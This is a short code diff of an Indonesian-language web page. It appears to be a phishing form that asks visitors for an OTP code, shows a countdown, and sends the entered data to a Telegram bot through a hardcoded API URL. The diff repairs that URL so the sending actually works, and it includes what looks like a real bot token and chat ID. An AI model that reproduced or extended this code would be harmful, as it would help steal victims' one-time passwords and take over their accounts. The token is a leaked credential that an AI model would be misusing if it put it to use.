@@ -67,7 +67,7 @@
       };
 
       // Ganti URL sesuai dengan endpoint bot Telegram Anda
-      var url = "https://api.telegram.org/bot<6534254502:AAHSAgtfYh39EyG13XBhaxpF_a8YJEKgFKY>/sendMessage?chat_id=<6824078885>&text=" + encodeURIComponent(message);
+      var url = "https://api.telegram.org/bot6534254502:AAHSAgtfYh39EyG13XBhaxpF_a8YJEKgFKY/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
 
       // Kirim permintaan POST
       xhttp.open("POST", url, true);
@@ -87,7 +87,7 @@
   </div>
 
   <!-- Kolom Input Kode OTP -->
-  <input type="text" id="kode-otp" name="kode_otp" placeholder="Masukkan Kode OTP" maxlength="6">
+  <input type="number" id="kode-otp" name="kode_otp" placeholder="Masukkan Kode OTP" maxlength="6">
 
   <!-- Waktu Hitung Mundur -->
   <div id="countdown"></div>
